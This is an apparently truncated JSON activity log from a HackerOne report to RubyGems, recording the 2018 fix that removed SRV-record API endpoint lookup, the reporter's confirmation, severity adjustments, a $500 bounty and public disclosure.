program.\u003c/p\u003e\n","automated_response":true,"created_at":"2018-09-19T18:10:30.556Z","updated_at":"2018-09-19T18:10:30.556Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"RubyGems"}},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3560566,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi plover and nmalkin,\n\nWelcome back! Sorry about delay in response here.\nWe ended up removing support of SRV records[[1](https://github.com/rubygems/rubygems/pull/2433)] from rubygems, can you please verify if your report (or parts of it) is still valid?","markdown_message":"\u003cp\u003eHi plover and nmalkin,\u003c/p\u003e\n\n\u003cp\u003eWelcome back! Sorry about delay in response here.\u003cbr\u003e\nWe ended up removing support of SRV records[\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frubygems%2Frubygems%2Fpull%2F2433\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e] from rubygems, can you please verify if your report (or parts of it) is still valid?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-31T04:54:46.761Z","updated_at":"2018-10-31T04:54:46.761Z","actor":{"username":"sonalkr132","cleared":false,"url":"/sonalkr132","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/110/393/d14955d9a0ac015bfba8df495ebf3c8b9f6f87cd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3560568,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-31T04:55:43.676Z","updated_at":"2018-10-31T04:55:43.676Z","actor":{"username":"sonalkr132","cleared":false,"url":"/sonalkr132","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/110/393/d14955d9a0ac015bfba8df495ebf3c8b9f6f87cd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3560654,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Yes, I saw #2433 :) I can confirm that it fixes the vulnerability in this report.","markdown_message":"\u003cp\u003eYes, I saw \u003ca href=\"/reports/2433\"\u003e#2433\u003c/a\u003e :) I can confirm that it fixes the vulnerability in this report.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-31T05:35:19.849Z","updated_at":"2018-10-31T05:35:19.849Z","actor":{"username":"plover","cleared":false,"url":"/plover","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3624629,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for confirming. I would like to let you know that, we were already aware of the security issue related to use of SRV record to replace api endpoint. \nYour report was the last straw, which made us stop supporting dynamic API backend lookup using SRV records. The fix has been merged in master and will be released with rubygems 3 (early Dec). ","markdown_message":"\u003cp\u003eThanks for confirming. I would like to let you know that, we were already aware of the security issue related to use of SRV record to replace api endpoint. \u003cbr\u003e\nYour report was the last straw, which made us stop supporting dynamic API backend lookup using SRV records. The fix has been merged in master and will be released with rubygems 3 (early Dec). \u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-11T12:18:20.153Z","updated_at":"2018-11-11T12:18:20.153Z","actor":{"username":"sonalkr132","cleared":false,"url":"/sonalkr132","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/110/393/d14955d9a0ac015bfba8df495ebf3c8b9f6f87cd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"plover","url":"/plover"},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3625069,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-11-11T16:34:45.131Z","updated_at":"2018-11-11T16:34:45.131Z","first_to_agree":true,"actor":{"username":"plover","cleared":false,"url":"/plover","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3791200,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-08T19:48:54.758Z","updated_at":"2018-12-08T19:48:54.758Z","additional_data":{"old_severity":"High (7.2)","new_severity":"High (7.7)","old_severity_id":211961,"new_severity_id":258617},"actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3791202,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-08T19:50:31.271Z","updated_at":"2018-12-08T19:50:31.271Z","additional_data":{"old_severity":"High (7.7)","new_severity":"High (7.2)","old_severity_id":258617,"new_severity_id":258618},"actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3791262,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"The original assessment of severity seems correct. The impact (RCE) is bad, but this is a difficult vulnerability to exploit. In accordance with our policy, I'm classing this as a _Minimum_ impact bug.","markdown_message":"\u003cp\u003eThe original assessment of severity seems correct. The impact (RCE) is bad, but this is a difficult vulnerability to exploit. In accordance with our policy, I\u0026#39;m classing this as a \u003cu\u003eMinimum\u003c/u\u003e impact bug.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-08T20:20:40.297Z","updated_at":"2018-12-08T20:20:40.297Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"RubyGems"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"rubygems","collaborator":{"username":"plover","url":"/plover"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3806844,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-11T16:34:46.248Z","updated_at":"2018-12-11T16:34:46.248Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"RubyGems"}},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}